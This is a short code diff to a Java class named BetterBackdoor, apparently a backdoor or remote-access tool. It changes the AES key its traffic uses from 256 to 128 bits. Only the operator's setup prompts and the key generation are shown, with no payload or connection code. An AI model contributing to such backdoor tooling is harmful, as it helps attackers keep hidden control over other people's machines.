@@ -45,7 +45,7 @@ public class BetterBackdoor {
 				String ipType = getInput("op01").equals("0") ? "internal" : "external";
 
 				String encryptionKey = null;
-				System.out.println("Would you like to encrypt data sent to and from the backdoor using an automatically generated 256 bit AES encryption key?(y/n):");
+				System.out.println("Would you like to encrypt data sent to and from the backdoor using an automatically generated 128 bit AES encryption key?(y/n):");
 				boolean encrypt = Boolean.parseBoolean(getInput("yn"));
 				if (encrypt) {
 					KeyGenerator keyGenerator;
@@ -54,7 +54,7 @@ public class BetterBackdoor {
 					} catch (NoSuchAlgorithmException e) {
 						throw new Exception("Could not generate encryption key.");
 					}
-					Objects.requireNonNull(keyGenerator).init(256);
+					Objects.requireNonNull(keyGenerator).init(128);
 					encryptionKey = Base64.getEncoder().encodeToString(keyGenerator.generateKey().getEncoded());
 					System.out.println("Automatically generated key: " + encryptionKey + "\n");
 				}
